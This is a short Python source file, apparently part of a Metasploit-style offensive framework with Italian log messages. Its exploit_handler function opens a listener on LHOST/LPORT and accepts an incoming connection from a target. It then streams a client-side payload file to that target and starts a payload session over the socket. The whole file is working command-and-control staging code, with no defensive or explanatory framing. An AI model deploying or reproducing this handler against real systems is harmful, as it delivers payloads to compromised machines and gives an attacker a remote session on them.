import socket
import os
from Lib.Debugger import info, error

from .payload_utils import get_payload

def exploit_handler(self) -> None:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as st:
        st.bind((self.LHOST, self.LPORT))
        st.listen(1)
        info(f"Server listening on {self.LHOST}:{self.LPORT}")
        try:
            conn, addr = st.accept()
            info(f"Connection from {addr}")

            payload_path = self.payload + ".py"
            clientpayload = "Client/" + "/".join(self.payload.split("/")[1:]) + ".py"

            size = os.stat(payload_path).st_size
            info(f"Payload size: {size} bytes")

            with open(clientpayload, "rb") as f:
                while True:
                    data = f.read(1024)
                    if not data:
                        conn.sendall(b"{fine}")
                        break
                    conn.sendall(data)

            info("Payload inviato correttamente")
            info("Session created")
            payload = get_payload(self.payload)
            try:
                payload.run(conn, addr)
            except Exception as e:
                print(e)
        except Exception as e:
            error(f"Errore durante la gestione della connessione: {e}")
